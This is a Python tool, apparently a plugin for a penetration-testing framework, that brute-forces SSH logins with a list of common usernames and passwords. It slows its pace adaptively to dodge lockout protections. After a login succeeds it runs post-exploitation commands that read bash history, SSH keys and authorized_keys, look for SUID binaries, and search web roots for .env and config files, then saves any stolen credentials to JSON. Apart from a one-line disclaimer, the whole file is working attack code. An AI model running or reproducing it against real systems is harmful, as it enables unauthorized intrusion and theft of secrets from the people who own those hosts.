#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
bruteforce.py - SSH智能防封爆破+后渗透
自适应降速防封禁，爆破成功后自动执行系统信息收集
⚠️ 仅用于授权安全测试
依赖: paramiko
"""

import os
import sys
import json
import time
import datetime
import threading
from typing import Optional, List, Dict

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from tools import RESULTS_BASE
from utils import Colors

TOOL_NAME = "SSH智能防封爆破 & 后渗透"
TOOL_ID = "bruteforce"
TOOL_DESC = "SSH智能防封爆破，三级自适应降速防封禁，爆破成功后自动执行深度后渗透信息收集"
TOOL_CATEGORY = "exploit"
TOOL_PRIORITY = 1

TIMEOUT = 8

TOP_SSH_PASSWORDS = [
    "root", "admin", "123456", "password", "12345678",
    "admin123", "toor", "1234", "p@ssw0rd", "12345",
    "passwd", "admin123456", "root123", "qwerty",
    "abc123", "111111", "letmein", "000000", "test",
]
TOP_USERS = ["root", "admin", "ubuntu", "debian", "user"]

POST_EXPLOIT_COMMANDS = [
    ("系统信息", "uname -a; cat /etc/os-release 2>/dev/null | head -4"),
    ("当前用户", "id; whoami; groups"),
    ("磁盘空间", "df -h / /home 2>/dev/null | tail -5"),
    ("内存/CPU", "free -h; uptime"),
    ("网络监听", "ss -tlnp 2>/dev/null | head -15 || netstat -tlnp 2>/dev/null | head -15"),
    ("Docker容器", "docker ps 2>/dev/null || echo '无Docker权限'"),
    ("计划任务", "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null | head -5"),
    ("历史命令", "tail -20 ~/.bash_history 2>/dev/null || echo '无历史'"),
    ("SSH密钥", "ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null | head -3"),
    ("可写目录", "find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null | head -5"),
    ("SUID文件", "find / -perm -4000 -type f 2>/dev/null | head -10"),
    ("敏感文件", "find /var/www -name '*.env' -o -name 'config.php' -o -name 'database.yml' 2>/dev/null | head -10"),
]


class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def exploit(self, msg): print(f"{Colors.MAGENTA}[⚡] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()


class SmartBruteForcer:
    """
    智能防封爆破引擎
    - 检测到连接重置 → 自动降速
    - 失败次数累积 → 冷却等待
    """

    def __init__(self, host: str, port: int = 22):
        self.host = host
        self.port = port
        self.found_credentials = []
        self.consecutive_failures = 0
        self._lock = threading.Lock()

    def _rate_limit_wait(self):
        with self._lock:
            self.consecutive_failures += 1
            if self.consecutive_failures <= 3:
                time.sleep(3)
            elif self.consecutive_failures <= 6:
                time.sleep(8)
            elif self.consecutive_failures <= 10:
                cooldown = 30
                logger.warning(f"检测到频繁失败，冷却 {cooldown}s")
                time.sleep(cooldown)
            else:
                cooldown = 60
                logger.warning(f"严重限速，冷却 {cooldown}s")
                time.sleep(cooldown)

    def _reset_failure_counter(self):
        with self._lock:
            if self.consecutive_failures > 0:
                self.consecutive_failures = max(0, self.consecutive_failures - 1)

    def try_ssh_login(self, username: str, password: str) -> Optional[dict]:
        try:
            import paramiko
        except ImportError:
            logger.error("paramiko未安装，请执行: pip install paramiko")
            return None

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.host, port=self.port, username=username,
                password=password, timeout=TIMEOUT,
                allow_agent=False, look_for_keys=False,
            )

            logger.exploit(f"SSH爆破成功: {username}:{password} @ {self.host}:{self.port}")
            post_info = self._post_exploit(client)
            client.close()
            self._reset_failure_counter()

            return {
                "service": "ssh",
                "host": self.host,
                "port": self.port,
                "username": username,
                "password": password,
                "post_exploit": post_info,
            }
        except paramiko.AuthenticationException:
            return None
        except OSError:
            self._rate_limit_wait()
            return None
        except Exception:
            return None

    def _post_exploit(self, client) -> Dict[str, str]:
        info = {}
        for desc, cmd in POST_EXPLOIT_COMMANDS:
            try:
                _, stdout, _ = client.exec_command(cmd, timeout=TIMEOUT)
                output = stdout.read().decode('utf-8', errors='replace').strip()
                if output:
                    info[desc] = output
                    logger.success(f"  {desc}:")
                    for line in output.split('\n')[:3]:
                        logger.raw(f"    {line}")
            except Exception:
                pass
        return info

    def brute_force(self, users: List[str], passwords: List[str]) -> List[dict]:
        total = len(users) * len(passwords)
        logger.info(f"智能爆破: {len(users)} 用户 x {len(passwords)} 密码 = {total} 组合")
        logger.info("策略: 自适应降速防封禁")

        for i, user in enumerate(users):
            for j, pwd in enumerate(passwords):
                attempt = i * len(passwords) + j + 1
                if attempt % 5 == 0:
                    logger.raw(f"  进度: {attempt}/{total} (失败计数:{self.consecutive_failures})")

                result = self.try_ssh_login(user, pwd)
                if result:
                    self.found_credentials.append(result)
                    return self.found_credentials

            time.sleep(1)

        return self.found_credentials


def execute(scan_result, target_info):
    """
    执行SSH智能防封爆破+后渗透
    """
    domain = target_info.get("domain", "unknown")
    ip = target_info.get("ip", domain)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    errors = []

    ssh_ports = [
        p["port"] for p in scan_result.get("ports", [])
        if p.get("service", "").lower() == "ssh"
    ]
    if not ssh_ports:
        ssh_ports = [22]

    ssh_port = ssh_ports[0]
    logger.info(f"目标: {ip}:{ssh_port}")

    try:
        brute = SmartBruteForcer(ip, port=ssh_port)
        credentials = brute.brute_force(TOP_USERS, TOP_SSH_PASSWORDS)
    except Exception as e:
        errors.append(str(e))
        credentials = []

    findings = []
    for cred in credentials:
        if "post_exploit" in cred:
            for desc, output in cred["post_exploit"].items():
                findings.append({"type": desc, "detail": output})

    if credentials:
        status = "success"
        summary = {
            "credentials": credentials,
            "total_credentials": len(credentials),
            "post_exploit_findings": len(findings),
        }
    else:
        status = "partial"
        summary = {
            "credentials": [],
            "total_credentials": 0,
            "note": f"未发现弱口令（{len(TOP_USERS)}用户x{len(TOP_SSH_PASSWORDS)}密码），密码可能较强或有fail2ban防护",
        }
        errors.append("未发现弱口令")

    result = {
        "tool": TOOL_ID,
        "target": domain,
        "time": timestamp,
        "status": status,
        "summary": summary,
        "errors": errors,
        "credentials": credentials,
        "findings": findings,
    }

    output_dir = os.path.join(RESULTS_BASE, TOOL_ID)
    os.makedirs(output_dir, exist_ok=True)
    ts_file = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(output_dir, f"result_{domain}_{ts_file}.json")
    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    logger.info(f"结果已保存: {out_file}")

    return result
